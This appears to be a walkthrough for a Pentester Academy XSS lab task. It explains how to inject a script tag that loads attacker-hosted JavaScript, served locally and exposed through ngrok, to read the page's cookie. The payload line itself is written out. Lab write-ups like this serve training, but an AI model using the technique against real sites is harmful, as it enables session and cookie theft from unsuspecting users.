## Task 9 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/9)</small>

Objectives:

1. Include an external JS file into this page
2. Code inside that JS should pop the cookie inside an alert box

So in this we are supposed to include a external JS which should alert the cookie.

Well finding the cookie is a piece of cake, [`document.cookie`](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie).

SPOILER!!, The post method is vulnerable to XSS. It rendereds the text in `<h2>...</h2>` tag. Since the website is hosted on a domain, using relative path won't work at all and if you are thinking of using `file://` scheme, let me tell you it will work only if the HTML is opened with `file://` scheme.

So what next, any online JS hosting platform? What about gists or github repo? Naah, on requesting raw, they will give you `text/plain` content type, not `application/javascript`

So the best way I came up with is,

1. Creating a file named `alert.js`
2. Adding the following payload
3. Run the python server in that directory `python -m http.server 3000`
4. Tunnel http 3000 port using ngrok `ngrok http 3000`

```js
<script src="{{ngrok_url}}/alert.js"></script>
```

**Note** Replace the `{{ngrok_url}}` with your ngrok tunneled URL

For POC, paste the script in the input tag and hit enter
